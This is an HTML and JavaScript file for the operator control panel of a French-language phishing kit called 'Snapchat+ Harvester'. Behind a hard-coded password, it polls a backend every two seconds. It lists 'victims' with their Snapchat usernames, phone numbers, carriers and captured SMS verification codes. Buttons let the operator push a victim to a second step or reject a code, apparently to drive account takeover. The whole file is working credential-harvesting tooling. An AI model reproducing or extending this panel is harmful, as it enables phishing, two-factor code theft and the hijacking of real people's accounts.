<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel | Snapchat Harvester</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');

        body {
            margin: 0;
            padding: 0;
            background: #0a0a0a;
            color: #fff;
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
        }

        .login-container {
            max-width: 420px;
            margin: 120px auto;
            padding: 40px;
            background: #1a1a1a;
            border-radius: 16px;
            text-align: center;
            border: 1px solid #333;
        }

        .header {
            background: #111;
            padding: 20px 30px;
            border-bottom: 1px solid #333;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
        }

        input#filter {
            width: 100%;
            padding: 14px;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 12px;
            color: #fff;
            margin-bottom: 20px;
            font-size: 16px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background: #1a1a1a;
            border-radius: 12px;
            overflow: hidden;
        }

        th, td {
            padding: 16px 20px;
            text-align: left;
            border-bottom: 1px solid #333;
        }

        th {
            background: #222;
            color: #FFFC00;
        }

        tr:hover {
            background: #252525;
        }

        .status {
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
        }

        .waiting { background: #8B0000; color: #fff; }
        .code_received { background: #006400; color: #fff; }
        .step2_forced { background: #FF8800; color: #000; }

        .actions {
            display: flex;
            gap: 8px;
        }

        .action-btn {
            padding: 8px 14px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            border: none;
            font-size: 13px;
        }
    </style>
</head>
<body>

    <!-- LOGIN -->
    <div id="loginScreen">
        <div class="login-container">
            <h1>🔐 Control Panel</h1>
            <p>Accès Administrateur</p>
            <input type="password" id="adminPass" placeholder="Mot de passe" autocomplete="off">
            <button onclick="login()">Se Connecter</button>
            <div id="error" style="color:#ff4444; margin-top:15px; display:none;">Mot de passe incorrect</div>
        </div>
    </div>

    <!-- PANEL SIMPLE -->
    <div id="mainPanel" style="display:none;">
        <div class="header">
            <h1>Snapchat+ Harvester — Control Panel</h1>
            <div>Victimes en ligne : <strong id="liveCount">0</strong></div>
        </div>

        <div class="container">
            <input type="text" id="filter" placeholder="Filtrer par Session ID, Username ou Téléphone...">

            <table id="victimsTable">
                <thead>
                    <tr>
                        <th>Session ID</th>
                        <th>Username</th>
                        <th>Téléphone</th>
                        <th>Opérateur</th>
                        <th>Statut</th>
                        <th>Code SMS</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody></tbody>
            </table>
        </div>
    </div>

    <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
    <script>
        const PASSWORD = "changeMoi123"; // CHANGE ÇA IMMÉDIATEMENT

        let victims = [];

        function login() {
            if (document.getElementById('adminPass').value.trim() === PASSWORD) {
                document.getElementById('loginScreen').style.display = 'none';
                document.getElementById('mainPanel').style.display = 'block';
                initPanel();
            } else {
                const err = document.getElementById('error');
                err.style.display = 'block';
                setTimeout(() => err.style.display = 'none', 3000);
            }
        }

        function initPanel() {
            async function loadVictims() {
                try {
                    const res = await fetch('/api/victims');
                    victims = await res.json();
                    renderTable();
                } catch(e) {
                    console.error(e);
                }
            }

            function renderTable() {
                const tbody = document.querySelector('#victimsTable tbody');
                tbody.innerHTML = '';
                let count = 0;

                victims.forEach(v => {
                    count++;
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td><code>${v.sessionId || '-'}</code></td>
                        <td>${v.username || '-'}</td>
                        <td>${v.phone || '-'}</td>
                        <td>${v.operator || '-'}</td>
                        <td><span class="status ${v.status || 'waiting'}">${v.status === 'waiting' ? '⏳ En attente' : v.status === 'step2_forced' ? '✅ Étape 2' : '✅ Code reçu'}</span></td>
                        <td><strong>${v.code || '-'}</strong></td>
                        <td class="actions">
                            <button class="action-btn" onclick="forceStep2('${v.sessionId}')" style="background:#FF8800;color:#000;">▶️ Étape 2</button>
                            <button class="action-btn" onclick="badCode('${v.sessionId}')" style="background:#FF4444;color:#fff;">Code mauvais</button>
                            <button class="action-btn delete-btn" onclick="deleteSession('${v.sessionId}', this)" style="background:#FF0000;color:#fff;">❌</button>
                        </td>
                    `;
                    tbody.appendChild(row);
                });

                document.getElementById('liveCount').textContent = count;
            }

            window.forceStep2 = async (sessionId) => {
                await fetch('/api/force-step2', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({sessionId})
                });
                loadVictims();
            };

            window.badCode = async (sessionId) => {
                await fetch('/api/bad-code', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({sessionId})
                });
                loadVictims();
            };

            window.deleteSession = (sessionId, btn) => {
                if (!confirm('Supprimer cette session ?')) return;
                btn.closest('tr').remove();
                loadVictims();
            };

            // Chargement toutes les 2 secondes
            setInterval(loadVictims, 2000);
            loadVictims();
        }

        // Login avec Entrée
        document.addEventListener('DOMContentLoaded', () => {
            const passInput = document.getElementById('adminPass');
            passInput.focus();
            passInput.addEventListener('keypress', e => {
                if (e.key === 'Enter') login();
            });
        });
    </script>
</body>
</html>
